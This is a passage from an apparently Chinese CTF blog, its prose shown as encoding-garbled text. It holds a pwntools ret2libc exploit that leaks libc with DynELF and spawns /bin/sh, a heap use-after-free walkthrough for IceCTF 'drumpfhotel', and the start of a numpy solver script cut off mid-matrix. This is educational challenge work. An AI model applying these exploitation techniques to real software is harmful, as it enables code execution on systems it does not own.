<h2 id="å¯»æ‰¾åœ°å€"><a href="#å¯»æ‰¾åœ°å€" class="headerlink" title="å¯»æ‰¾åœ°å€"></a>å¯»æ‰¾åœ°å€</h2><p>é€šè¿‡DynELFæ¨¡å—åªèƒ½è·å–åˆ°system()åœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œä½†æ— æ³•è·å–å­—ç¬¦ä¸²â€œ/bin/shâ€åœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨payloadä¸­éœ€è¦è°ƒç”¨read()å°†â€œ/bin/shâ€è¿™å­—ç¬¦ä¸²å†™å…¥åˆ°ç¨‹åºçš„.bssæ®µä¸­ã€‚.bssæ®µæ˜¯ç”¨æ¥ä¿å­˜å…¨å±€å˜é‡çš„å€¼çš„ï¼Œåœ°å€å›ºå®šï¼Œå¹¶ä¸”å¯ä»¥è¯»å¯å†™ã€‚æ‰€ä»¥é¦–å…ˆè¦æ‰¾åˆ°bssæ®µçš„åœ°å€é€šè¿‡readelf -S level2è¿™ä¸ªå‘½ä»¤å°±å¯ä»¥è·å–åˆ°bssæ®µçš„åœ°å€äº†ã€‚</p>
<p>å› ä¸ºæˆ‘ä»¬åœ¨æ‰§è¡Œå®Œread()ä¹‹åè¦æ¥ç€è°ƒç”¨system(â€œ/bin/shâ€)ï¼Œå¹¶ä¸”read()è¿™ä¸ªå‡½æ•°çš„å‚æ•°æœ‰ä¸‰ä¸ªï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸€ä¸ªpop pop pop retçš„gadgetç”¨æ¥ä¿è¯æ ˆå¹³è¡¡ã€‚è¿™ä¸ªgadgetéå¸¸å¥½æ‰¾ï¼Œç”¨objdumpå°±å¯ä»¥è½»æ¾æ‰¾åˆ°ã€‚</p>
<p>æœ€åéœ€è¦å¯»æ‰¾çš„å°±æ˜¯vulfun_add,ç›´æ¥ç”¨gdbåç¼–è¯‘ä¸€ä¸‹ç¨‹åºå°±å¯ä»¥äº†ã€‚</p>
<pre><code>da$ disassemble vlun_fun 
Dump of assembler code for function vlun_fun:
   0x0804844d &lt;+0&gt;:    push   ebp
   0x0804844e &lt;+1&gt;:    mov    ebp,esp
   0x08048450 &lt;+3&gt;:    sub    esp,0x98
   0x08048456 &lt;+9&gt;:    mov    DWORD PTR [esp+0x8],0x100
   0x0804845e &lt;+17&gt;:    lea    eax,[ebp-0x88]
   0x08048464 &lt;+23&gt;:    mov    DWORD PTR [esp+0x4],eax
   0x08048468 &lt;+27&gt;:    mov    DWORD PTR [esp],0x0
   0x0804846f &lt;+34&gt;:    call   0x8048310 &lt;read@plt&gt;
   0x08048474 &lt;+39&gt;:    leave  
   0x08048475 &lt;+40&gt;:    ret    
</code></pre><p>å’Œæ˜æ˜¾åœ°å€æ˜¯0x0804844d</p>
<h2 id="æœ€ç»ˆçš„exp"><a href="#æœ€ç»ˆçš„exp" class="headerlink" title="æœ€ç»ˆçš„exp"></a>æœ€ç»ˆçš„exp</h2><p>æ•´ä¸ªæ”»å‡»è¿‡ç¨‹å¦‚ä¸‹ï¼šé¦–å…ˆé€šè¿‡DynELFè·å–åˆ°system()çš„åœ°å€åï¼Œæˆ‘ä»¬åˆé€šè¿‡readå°†â€œ/bin/shâ€å†™å…¥åˆ°.bssæ®µä¸Šï¼Œæœ€åå†è°ƒç”¨systemï¼ˆ.bssï¼‰ï¼Œæ‰§è¡Œâ€œ/bin/shâ€ã€‚æœ€ç»ˆçš„expå¦‚ä¸‹:</p>
<pre><code>#!python
#!/usr/bin/env python
from pwn import *
elf = ELF(&apos;./test2&apos;)
plt_write = elf.symbols[&apos;write&apos;]
plt_read = elf.symbols[&apos;read&apos;]
vulfun_addr = 0x0804844d

def leak(address):
    payload1 = &apos;a&apos;*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(address) + p32(4)
    p.send(payload1)
    data = p.recv(4)
    print &quot;%#x =&gt; %s&quot; % (address, (data or &apos;&apos;).encode(&apos;hex&apos;))
    return data
p = process(&apos;./test2&apos;)
gdb.attach(p,&quot;b *0x804850d&quot;)
#p = remote(&apos;127.0.0.1&apos;, 10002)
d = DynELF(leak, elf=ELF(&apos;./test2&apos;))
system_addr = d.lookup(&apos;system&apos;, &apos;libc&apos;)
print &quot;system_addr=&quot; + hex(system_addr)
bss_addr = 0x0804a024
pppr = 0x804850d
payload2 = &apos;a&apos;*140  + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8) 
payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)
payload2 += &apos;C&apos; * (256 - len(payload2))
#ss = raw_input()
print &quot;\n###sending payload2 ...###&quot;
p.send(payload2)
p.send(&quot;/bin/sh\0&quot;)
p.interactive()
</code></pre><p>è¿™ä¸ªexpåœ¨32kaliä¸Šå¯ä»¥è·å¾—æƒé™ï¼Œåœ¨æˆ‘çš„64ä½Ubuntuä¸Šæ— æ³•è·å¾—æƒé™ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œçº ç»“ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pwnç¬¬ä¸€æ›´-Icectf_drumpfhotel</title>
    <url>/2016/11/08/pwn%E7%AC%AC%E4%B8%80%E6%9B%B4-Icectf-drumpfhotel/</url>
    <content><![CDATA[<p>æœ€è¿‘åœ¨åˆ·é¢˜çš„æ—¶å€™å‘ç°çš„ä¸€é“ç›¸å¯¹ç®€å•çš„æº¢å‡ºé¢˜ç›®ï¼Œä½†æ˜¯å¯èƒ½å¯¹å †æº¢å‡ºæ–¹é¢çŸ¥è¯†æ¶‰åŠçš„ä¸å¤šï¼Œå¯¼è‡´èŠ±äº†ä¸å°‘æ—¶é—´å»ç ”ç©¶åŸç†ï¼Œæ„Ÿè§‰è¿˜æœ‰æœ‰ä¸å°‘æ”¶è·çš„ã€‚<br><a id="more"></a></p>
<p>ä»£å¼€ç•Œé¢å°±æ˜¯ä¸€ä¸ªç®€å•çš„å®¾é¦†é¢„å®šç³»ç»Ÿ</p>
<p>ä½¿ç”¨IDAåˆ†æå‡½æ•°ï¼Œä¸»è¦çš„å‡½æ•°åŒ…æ‹¬mian(),book_suite(),book_room(),delete_booking(),print_booking()è¿˜æœ‰æœ€ä¸»è¦çš„flag().</p>
<p>é¦–å…ˆåœ¨mainå‡½æ•°é‡Œä¼šç»™ä¸ªäº”ä¸ªé€‰æ‹©ï¼Œé¢„å®šsuiteã€roomï¼Œåˆ é™¤é¢„å®šï¼Œæ‰“å°é¢„å®šï¼Œé€€å‡ºã€‚</p>
<p>é¦–å…ˆåˆ†æbook_suite(),å¤§è‡´çš„æƒ…å½¢å°±æ˜¯åœ¨å †ä¸Šç”³è¯·äº†264ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼Œå‰å››ä¸ªå­—èŠ‚å‚¨å­˜print_name()å‡½æ•°ï¼Œ256ä¸ªå­—èŠ‚å‚¨å­˜nameï¼Œå¦å¤–å››ä¸ªå­˜å‚¨suite nummberã€‚</p>
<pre><code>Dump of assembler code for function book_suite:
   0x0804873b &lt;+0&gt;: push   %ebp
   0x0804873c &lt;+1&gt;: mov    %esp,%ebp
   0x0804873e &lt;+3&gt;: push   %ebx
   0x0804873f &lt;+4&gt;: sub    $0x34,%esp
   0x08048742 &lt;+7&gt;: mov    %gs:0x14,%eax
   0x08048748 &lt;+13&gt;: mov    %eax,-0xc(%ebp)
   0x0804874b &lt;+16&gt;: xor    %eax,%eax
   0x0804874d &lt;+18&gt;: movl   $0x108,(%esp)   --&gt;Allocate 264 bytes in heap memory
   0x08048754 &lt;+25&gt;: call   0x80484e0 &lt;malloc@plt&gt; --&gt; return ptr to memory in eax
   0x08048759 &lt;+30&gt;: mov    %eax,0x804b088  --&gt; assign ptr to variable suite
   0x0804875e &lt;+35&gt;: movl   $0x8049688,(%esp)
   0x08048765 &lt;+42&gt;: call   0x8048490 &lt;printf@plt&gt; --&gt; print &quot;Name:&quot;
   0x0804876a &lt;+47&gt;: mov    0x804b080,%eax
   0x0804876f &lt;+52&gt;: mov    %eax,(%esp)
   0x08048772 &lt;+55&gt;: call   0x80484a0 &lt;fflush@plt&gt;
   0x08048777 &lt;+60&gt;: mov    0x804b060,%eax
   0x0804877c &lt;+65&gt;: mov    0x804b088,%edx  --&gt; variable suite
   0x08048782 &lt;+71&gt;: add    $0x4,%edx
   0x08048785 &lt;+74&gt;: mov    %eax,0x8(%esp)
   0x08048789 &lt;+78&gt;: movl   $0x100,0x4(%esp)--&gt; length 0x100(256 bytes)
   0x08048791 &lt;+86&gt;: mov    %edx,(%esp)   
   0x08048794 &lt;+89&gt;: call   0x80484c0 &lt;fgets@plt&gt;--&gt; read from stdin, store name at address suite+4, length 0x100(256 bytes)
   0x08048799 &lt;+94&gt;: mov    0x804b088,%eax  --&gt; var suite into eax
   0x0804879e &lt;+99&gt;: movl   $0x8048a84,(%eax)--&gt; store address of print_name function(0x8048a84) into memory location at suite
   0x080487a4 &lt;+105&gt;: movl   $0x804968f,(%esp)     --&gt;&quot;Suite number:&quot;
   0x080487ab &lt;+112&gt;: call   0x8048490 &lt;printf@plt&gt;
   0x080487b0 &lt;+117&gt;: mov    0x804b080,%eax
   0x080487b5 &lt;+122&gt;: mov    %eax,(%esp)
   0x080487b8 &lt;+125&gt;: call   0x80484a0 &lt;fflush@plt&gt;
   0x080487bd &lt;+130&gt;: mov    0x804b060,%eax   --&gt;stdin
   0x080487c2 &lt;+135&gt;: mov    %eax,0x8(%esp)   --&gt;push stdin stream
   0x080487c6 &lt;+139&gt;: movl   $0x10,0x4(%esp)  --&gt;read only 16bytes from stdin. *Cannot stack overflow*
   0x080487ce &lt;+147&gt;: lea    -0x1c(%ebp),%eax --&gt;store in stack starting at $ebp-0x1c (28bytes away from base of stack)
   0x080487d1 &lt;+150&gt;: mov    %eax,(%esp)
   0x080487d4 &lt;+153&gt;: call   0x80484c0 &lt;fgets@plt&gt; --&gt; get suite number from stdin and store in stack
   0x080487d9 &lt;+158&gt;: mov    0x804b088,%ebx   --&gt; pointer suite
   0x080487df &lt;+164&gt;: lea    -0x1c(%ebp),%eax
   0x080487e2 &lt;+167&gt;: mov    %eax,(%esp)      
   0x080487e5 &lt;+170&gt;: call   0x8048530 &lt;atoi@plt&gt;
   0x080487ea &lt;+175&gt;: mov    %eax,0x104(%ebx)--&gt; save integer result into  suite+0x104
   0x080487f0 &lt;+181&gt;: movl   $0x804969e,(%esp)  --&gt; &quot;Booked a suite!&quot;
   0x080487f7 &lt;+188&gt;: call   0x80484f0 &lt;puts@plt&gt;
   0x080487fc &lt;+193&gt;: mov    0x804b080,%eax
   0x08048801 &lt;+198&gt;: mov    %eax,(%esp)
   0x08048804 &lt;+201&gt;: call   0x80484a0 &lt;fflush@plt&gt;
   0x08048809 &lt;+206&gt;: mov    -0xc(%ebp),%eax  --&gt;Stack canary
   0x0804880c &lt;+209&gt;: xor    %gs:0x14,%eax
   0x08048813 &lt;+216&gt;: je     0x804881a &lt;book_suite+223&gt;
   0x08048815 &lt;+218&gt;: call   0x80484d0 &lt;__stack_chk_fail@plt&gt;
   0x0804881a &lt;+223&gt;: add    $0x34,%esp
   0x0804881d &lt;+226&gt;: pop    %ebx
   0x0804881e &lt;+227&gt;: pop    %ebp
   0x0804881f &lt;+228&gt;: ret    
End of assembler dump.
</code></pre><p>ä½¿ç”¨gdbæŸ¥çœ‹å †åœ°å€åˆ†é…ï¼Œç¬¬ä¸€ä¸ªåœ°å€å°±æ˜¯print_name()å‡½æ•°çš„åœ°å€ã€‚</p>
<pre><code>(gdb) x/100wx suite
0x804c008: 0x08048a84(func) 0x62626262 0x00000a62 0x00000000
0x804c018: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c028: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c038: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c048: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c058: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c068: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c078: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c088: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c098: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c0a8: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c0b8: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c0c8: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c0d8: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c0e8: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c0f8: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c108: 0x00000000 0x0804863d(int) 0x00000000 0x00020ef1
0x804c118: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c128: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c138: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c148: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c158: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c168: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c178: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c188: 0x00000000 0x00000000 0x00000000 0x00000000
</code></pre><p>æ¥ä¸‹é‡Œæ˜¯book_roomå‡½æ•°ï¼Œåˆ†é…äº†å¤§å°ä¸º260çš„å †å†…å­˜ï¼Œ256å¤§å°çš„å‘å†…å­˜å‚¨å­˜nameï¼Œå‰©ä¸‹4ä¸ªå­—èŠ‚å‚¨å­˜room_nummber.</p>
<pre><code>(gdb) disass book_room
Dump of assembler code for function book_room:
   0x08048820 &lt;+0&gt;: push   %ebp
   0x08048821 &lt;+1&gt;: mov    %esp,%ebp
   0x08048823 &lt;+3&gt;: push   %ebx
   0x08048824 &lt;+4&gt;: sub    $0x34,%esp
   0x08048827 &lt;+7&gt;: mov    %gs:0x14,%eax
   0x0804882d &lt;+13&gt;: mov    %eax,-0xc(%ebp)
   0x08048830 &lt;+16&gt;: xor    %eax,%eax
   0x08048832 &lt;+18&gt;: movl   $0x104,(%esp)   
   0x08048839 &lt;+25&gt;: call   0x80484e0 &lt;malloc@plt&gt;--&gt; allocate 260 bytes in heap
   0x0804883e &lt;+30&gt;: mov    %eax,0x804b08c  --&gt; save pointer to variable room 
   0x08048843 &lt;+35&gt;: movl   $0x8049688,(%esp) --&gt; &quot;Name: &quot;
   0x0804884a &lt;+42&gt;: call   0x8048490 &lt;printf@plt&gt;
   0x0804884f &lt;+47&gt;: mov    0x804b080,%eax
   0x08048854 &lt;+52&gt;: mov    %eax,(%esp)
   0x08048857 &lt;+55&gt;: call   0x80484a0 &lt;fflush@plt&gt;
   0x0804885c &lt;+60&gt;: mov    0x804b060,%eax
   0x08048861 &lt;+65&gt;: mov    0x804b08c,%edx --&gt; variable room
   0x08048867 &lt;+71&gt;: add    $0x4,%edx
   0x0804886a &lt;+74&gt;: mov    %eax,0x8(%esp)
   0x0804886e &lt;+78&gt;: movl   $0x100,0x4(%esp)
   0x08048876 &lt;+86&gt;: mov    %edx,(%esp)
   0x08048879 &lt;+89&gt;: call   0x80484c0 &lt;fgets@plt&gt; --&gt; read from stdin, store name at address room+4, length 0x100(256 bytes)
   0x0804887e &lt;+94&gt;: movl   $0x80496ae,(%esp)  --&gt; &quot;Room Number: &quot;
   0x08048885 &lt;+101&gt;: call   0x8048490 &lt;printf@plt&gt;
   0x0804888a &lt;+106&gt;: mov    0x804b080,%eax
   0x0804888f &lt;+111&gt;: mov    %eax,(%esp)
   0x08048892 &lt;+114&gt;: call   0x80484a0 &lt;fflush@plt&gt;
   0x08048897 &lt;+119&gt;: mov    0x804b060,%eax
   0x0804889c &lt;+124&gt;: mov    %eax,0x8(%esp)
   0x080488a0 &lt;+128&gt;: movl   $0x10,0x4(%esp)  --&gt; read 16 bytes
   0x080488a8 &lt;+136&gt;: lea    -0x1c(%ebp),%eax 
   0x080488ab &lt;+139&gt;: mov    %eax,(%esp)
   0x080488ae &lt;+142&gt;: call   0x80484c0 &lt;fgets@plt&gt;
   0x080488b3 &lt;+147&gt;: mov    0x804b08c,%ebx
   0x080488b9 &lt;+153&gt;: lea    -0x1c(%ebp),%eax
   0x080488bc &lt;+156&gt;: mov    %eax,(%esp)
   0x080488bf &lt;+159&gt;: call   0x8048530 &lt;atoi@plt&gt;
   0x080488c4 &lt;+164&gt;: mov    %eax,(%ebx)  --&gt; save room number into address room
   0x080488c6 &lt;+166&gt;: movl   $0x80496bc,(%esp)
   0x080488cd &lt;+173&gt;: call   0x80484f0 &lt;puts@plt&gt; &quot;Booked a room!&quot;
   0x080488d2 &lt;+178&gt;: mov    0x804b080,%eax
   0x080488d7 &lt;+183&gt;: mov    %eax,(%esp)
   0x080488da &lt;+186&gt;: call   0x80484a0 &lt;fflush@plt&gt;
   0x080488df &lt;+191&gt;: mov    -0xc(%ebp),%eax
   0x080488e2 &lt;+194&gt;: xor    %gs:0x14,%eax
   0x080488e9 &lt;+201&gt;: je     0x80488f0 &lt;book_room+208&gt;
   0x080488eb &lt;+203&gt;: call   0x80484d0 &lt;__stack_chk_fail@plt&gt;
   0x080488f0 &lt;+208&gt;: add    $0x34,%esp
   0x080488f3 &lt;+211&gt;: pop    %ebx
   0x080488f4 &lt;+212&gt;: pop    %ebp
   0x080488f5 &lt;+213&gt;: ret    
End of assembler dump.
(gdb) 
</code></pre><p>æŸ¥çœ‹å †ç»“æ„ï¼Œå‘ç°å‰å››ä¸ªå­—èŠ‚å‚¨å­˜çš„å°±æ˜¯room_nummber</p>
<pre><code>(gdb) x/100wx room
0x804c008: 0x00000001(int) 0x61616161 0x00000a61 0x00000000
0x804c018: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c028: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c038: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c048: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c058: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c068: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c078: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c088: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c098: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c0a8: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c0b8: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c0c8: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c0d8: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c0e8: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c0f8: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c108: 0x00000000 0x00020ef9 0x00000000 0x00000000
0x804c118: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c128: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c138: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c148: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c158: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c168: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c178: 0x00000000 0x00000000 0x00000000 0x00000000
0x804c188: 0x00000000 0x00000000 0x00000000 0x00000000
</code></pre><p>ä¸»è¦çš„é—®é¢˜åœ¨print_bookingä¸­ï¼Œè¿™ä¸ªå‡½æ•°é‡Œè°ƒç”¨äº†print_nameå‡½æ•°</p>
<pre><code>(gdb) disass print_booking
Dump of assembler code for function print_booking:
   0x080489a5 &lt;+0&gt;: push   %ebp
   0x080489a6 &lt;+1&gt;: mov    %esp,%ebp
   0x080489a8 &lt;+3&gt;: sub    $0x28,%esp
   0x080489ab &lt;+6&gt;: mov    %gs:0x14,%eax
   0x080489b1 &lt;+12&gt;: mov    %eax,-0xc(%ebp)
   0x080489b4 &lt;+15&gt;: xor    %eax,%eax
   0x080489b6 &lt;+17&gt;: mov    0x804b088,%eax  --&gt; pointer suite
   0x080489bb &lt;+22&gt;: test   %eax,%eax
   0x080489bd &lt;+24&gt;: jne    0x80489e6 &lt;print_booking+65&gt;
   0x080489bf &lt;+26&gt;: mov    0x804b08c,%eax
   0x080489c4 &lt;+31&gt;: test   %eax,%eax
   0x080489c6 &lt;+33&gt;: jne    0x80489e6 &lt;print_booking+65&gt;
   0x080489c8 &lt;+35&gt;: movl   $0x80496cb,(%esp)
   0x080489cf &lt;+42&gt;: call   0x8048490 &lt;printf@plt&gt;
   0x080489d4 &lt;+47&gt;: mov    0x804b080,%eax
   0x080489d9 &lt;+52&gt;: mov    %eax,(%esp)
   0x080489dc &lt;+55&gt;: call   0x80484a0 &lt;fflush@plt&gt;
   0x080489e1 &lt;+60&gt;: jmp    0x8048a71 &lt;print_booking+204&gt;
   0x080489e6 &lt;+65&gt;: mov    0x804b088,%eax --&gt; pointer suite
   0x080489eb &lt;+70&gt;: test   %eax,%eax
   0x080489ed &lt;+72&gt;: je     0x8048a2c &lt;print_booking+135&gt;
   0x080489ef &lt;+74&gt;: mov    0x804b088,%eax
   0x080489f4 &lt;+79&gt;: mov    (%eax),%eax --&gt;address of print_name function in suite
   0x080489f6 &lt;+81&gt;: mov    0x804b088,%edx
   0x080489fc &lt;+87&gt;: add    $0x4,%edx
   0x080489ff &lt;+90&gt;: mov    %edx,(%esp) --&gt; location of string for suite name
   0x08048a02 &lt;+93&gt;: call   *%eax --&gt; call print_name function giving it location of suite name **Need to overwrite value of print_name function in suite with address of function flag()
   0x08048a04 &lt;+95&gt;: mov    0x804b088,%eax
   0x08048a09 &lt;+100&gt;: mov    0x104(%eax),%eax
   0x08048a0f &lt;+106&gt;: mov    %eax,0x4(%esp)
   0x08048a13 &lt;+110&gt;: movl   $0x804970a,(%esp)
   0x08048a1a &lt;+117&gt;: call   0x8048490 &lt;printf@plt&gt;
   0x08048a1f &lt;+122&gt;: mov    0x804b080,%eax
   0x08048a24 &lt;+127&gt;: mov    %eax,(%esp)
   0x08048a27 &lt;+130&gt;: call   0x80484a0 &lt;fflush@plt&gt;
   0x08048a2c &lt;+135&gt;: mov    0x804b08c,%eax
   0x08048a31 &lt;+140&gt;: test   %eax,%eax
   0x08048a33 &lt;+142&gt;: je     0x8048a71 &lt;print_booking+204&gt;
   0x08048a35 &lt;+144&gt;: mov    0x804b08c,%eax
   0x08048a3a &lt;+149&gt;: add    $0x4,%eax
   0x08048a3d &lt;+152&gt;: mov    %eax,0x4(%esp)
   0x08048a41 &lt;+156&gt;: movl   $0x804971c,(%esp)
   0x08048a48 &lt;+163&gt;: call   0x8048490 &lt;printf@plt&gt;
   0x08048a4d &lt;+168&gt;: mov    0x804b08c,%eax
   0x08048a52 &lt;+173&gt;: mov    (%eax),%eax
   0x08048a54 &lt;+175&gt;: mov    %eax,0x4(%esp)
   0x08048a58 &lt;+179&gt;: movl   $0x804970a,(%esp)
   0x08048a5f &lt;+186&gt;: call   0x8048490 &lt;printf@plt&gt;
   0x08048a64 &lt;+191&gt;: mov    0x804b080,%eax
   0x08048a69 &lt;+196&gt;: mov    %eax,(%esp)
   0x08048a6c &lt;+199&gt;: call   0x80484a0 &lt;fflush@plt&gt;
   0x08048a71 &lt;+204&gt;: mov    -0xc(%ebp),%eax
   0x08048a74 &lt;+207&gt;: xor    %gs:0x14,%eax
   0x08048a7b &lt;+214&gt;: je     0x8048a82 &lt;print_booking+221&gt;
   0x08048a7d &lt;+216&gt;: call   0x80484d0 &lt;__stack_chk_fail@plt&gt;
   0x08048a82 &lt;+221&gt;: leave  
   0x08048a83 &lt;+222&gt;: ret    
End of assembler dump.
(gdb)  
</code></pre><p>ä¹‹åçš„delete_booking()å‡½æ•°ä¸»è¦æ˜¯free()å †å—ï¼Œåˆ©ç”¨è¿‡ç¨‹å°±æ˜¯é¦–å…ˆä¸ºsuiteç”³è¯·å †å—ï¼Œç„¶åfreeæ‰ï¼Œä¹‹åä¸ºroomç”³è¯·å †å—ï¼Œnummberå¤„è¾“å…¥flag()åœ°å€çš„åè¿›åˆ¶ï¼Œè¿™æ ·suiteå’Œroomçš„å‰å››ä¸ªå­—èŠ‚éƒ½æŒ‡å‘åŒä¸€ä¸ªåœ°å€ï¼Œé€ æˆroomå‰å››ä¸ªå­—èŠ‚åœ°å€æŒ‡é’ˆæ··ä¹±ï¼Œè€Œsuite()çš„print_name()å‡½æ•°åœ°å€è¢«è½¬æ¢ä¸ºflag()åœ°å€ã€‚</p>
<p><img src="http://i1.piimg.com/567571/14380bddf3869ff4.png" alt=""></p>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>pythonåŸºäºnumpyè§£æ–¹ç¨‹ç»„</title>
    <url>/2016/11/28/python%E5%9F%BA%E4%BA%8Enumpy%E8%A7%A3%E6%96%B9%E7%A8%8B%E7%BB%84/</url>
    <content><![CDATA[<p>å‰ä¸¤å¤©åœ¨åšhctfçš„æ—¶å€™é‡åˆ°ä¸€ä¸ªé¢˜ç›®ï¼Œå‰å¹´çš„400åˆ†ï¼Œé€šè¿‡IDAåˆ†æå¯ä»¥çœ‹å‡ºå°±æ˜¯ä¸€ä¸ªæœ‰22ä¸ªæœªçŸ¥æ•°çš„æ–¹ç¨‹ç»„çš„æ±‚è§£ã€‚<br><a id="more"></a></p>
<p>çœ‹äº†å‰å¹´çš„writeupåŠ ä¸Šä¸€ä½å¤§ç‰›çš„æŒ‡ç‚¹ï¼Œé€šè¿‡numpyè¿™ä¸ªåŒ…å†™äº†pythonè„šæœ¬ï¼Œç»ˆäºå¾—åˆ°äº†flagã€‚</p>
<pre><code>import sys
import numpy
verify=[
0x83CD50,
0x706048,
0xA9AC74,
0x9A4AF2,
0x9F79A0,
0x7F51A2,
0x7E4CD8,
0x7038B0,
0x7B3708,
0x687078,
0x806066,
0x8F2F2E,
0x928B34,
0x7FEDDC,
0x825768,
0xACB91E,
0x90402E,
0x6F7386,
0xA01C72,
0x7C7250,
0x7AB115,
0x893C38
]//è¿™ä¸€ä¸ªæ•°ç»„é‡ŒåŒ…å«çš„æ˜¯æ–¹ç¨‹ç»„çš„ç»“æœ
matrix=[[8923, 659, 1303, 1949, 4447, 3527, 757, 367, 5507, 7907, 691, 9629, 5303, 8117, 9103, 9391, 89, 3361, 751, 9067, 5417, 6829],
        [9067, 1259, 107, 8597, 4229, 1213, 8831, 3259, 269, 5323, 769, 1237, 5501, 6763, 8053, 67, 3163, 3863, 4447, 5569, 4357, 5503],
        [9533, 23, 1973, 8269, 6961, 8929, 6301, 2791, 4861, 8053, 1609, 8219, 911, 7583, 6143, 2953, 7247, 6131, 7853, 4451, 7187, 8629],
        [1039, 389, 1487, 5987, 937, 239, 3583, 2897, 8893, 3307, 7459, 8521, 9769, 9689, 6959, 7949, 9137, 3461, 4229, 9059, 7177, 7643],
        [7853, 6271, 9371, 1613, 73, 8243, 9013, 919, 5387, 2207, 6211, 139, 5077, 7211, 2053, 8443, 4421, 5717, 8779, 8971, 6337, 7159],
        [3019, 8377, 1613, 1973, 3923, 8821, 797, 4969, 7643, 7297, 2381, 4679, 5869, 647, 7411, 3329, 6199, 7349, 4969, 8731, 877, 1039],
        [3089, 9859, 7159, 227, 271, 8161, 1051, 5701, 1259, 1361, 3673, 8311, 4679, 7877, 2621, 991, 9949, 683, 743, 6079, 2473, 4519],
        [1259, 4651, 5479, 4951, 4657, 4591, 509, 3821, 6661, 4127, 2011, 4547, 7621, 5261, 5261, 2003, 4871, 457, 2083, 4561, 6947, 1187],
        [4703, 9629, 3769, 2003, 1297, 4283, 2381, 8429, 7057, 9371, 4483, 4099, 1873, 499, 7583, 5897, 937, 727, 241, 4799, 6361, 5531],
        [283, 5591, 151, 2113, 7229, 307, 3851, 8963, 2777, 7757, 8831, 17, 8563, 1543, 8243, 3529, 3833, 2411, 2897, 19, 3559, 853],
        [9467, 2207, 2269, 2083, 7741, 5801, 2633, 349, 9257, 479, 331, 7649, 5393, 887, 6329, 4243, 3329, 7121, 4001, 6043, 8263, 3253],
        [4993, 7577, 6833, 661, 4129, 67, 2791, 3121, 4597, 8053, 8147, 1619, 5801, 6173, 127, 8179, 8093, 9319, 1063, 9157, 7817, 2341],
        [1493, 9137,9787, 617, 5557, 8387, 4219, 3301, 251, 3203, 8443, 2521, 2887, 2437, 7883, 5653, 3907, 4457, 9091, 523, 887, 8101],
        [9467, 2251, 9067, 4153,557, 4999, 5669, 9343, 7949, 7019, 113, 1801, 1867, 1187, 3541, 5527, 2347, 4813, 3019, 683, 6869, 5051],
        [7333, 8677, 3557, 4099, 5279, 449, 2099, 8929, 5393, 1933,9157, 6827, 467, 3299, 443, 3739, 823, 7499, 691, 2467, 281, 4049],
        [7489,739, 9769, 7963, 5651, 7691, 947, 8537, 4943, 1187, 4651, 9011, 6359, 1063, 7541, 9187, 2551, 7649, 4001, 3187, 6199, 7433],
        [5653, 9349, 9419, 2459, 2423, 1823, 1291,2423, 3671, 4673, 1033, 8389, 2777, 8629, 6203, 6673, 1877, 7583, 5077, 9227, 6037, 2339],
        [1663, 3529, 9631, 6833,17, 3697, 4327, 6053, 7639, 6679, 797, 3209, 3191, 3259, 5563, 5717, 3181, 1571, 751, 1163, 211, 4421],
        [2273, 9341, 8081, 9311, 41, 4241, 1279, 4483, 6581, 6863, 7583, 4129, 1543, 5651, 4357,9521, 5557, 11, 7723, 2441, 6733, 6521],
        [1171, 241,9851, 3583, 1609, 43, 9281, 5867, 2819, 5659, 4493, 223, 2767, 3221, 6173, 6947, 5897, 6113, 6737, 3989, 9733, 3467],
        [173, 2099, 2953, 7243, 4987, 1723, 2657, 1213, 2731, 7507, 9721, 4637, 9203, 5407, 3169, 5003, 8681,2, 3329, 5843, 8017, 83],
